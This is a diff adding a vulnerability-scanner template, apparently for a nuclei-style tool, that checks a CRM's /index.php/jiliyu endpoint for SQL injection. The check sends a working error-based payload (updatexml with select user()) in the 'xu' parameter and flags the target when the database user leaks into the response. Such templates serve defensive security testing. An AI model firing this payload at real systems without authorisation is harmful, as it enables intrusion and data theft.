@@ -1,0 +1,13 @@
+cve-id: bgk-crm-indexphp-jiliyu-sqli
+set:
+  boundary: '{{to_lower(rand_base(20))}}'
+  filename: '{{to_lower(rand_base(10))}}'
+rules:
+- method: GET
+  path: /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+  expression: |
+    response.body.bcontains(b"@localhost~")
+severity: high
+type: sqli
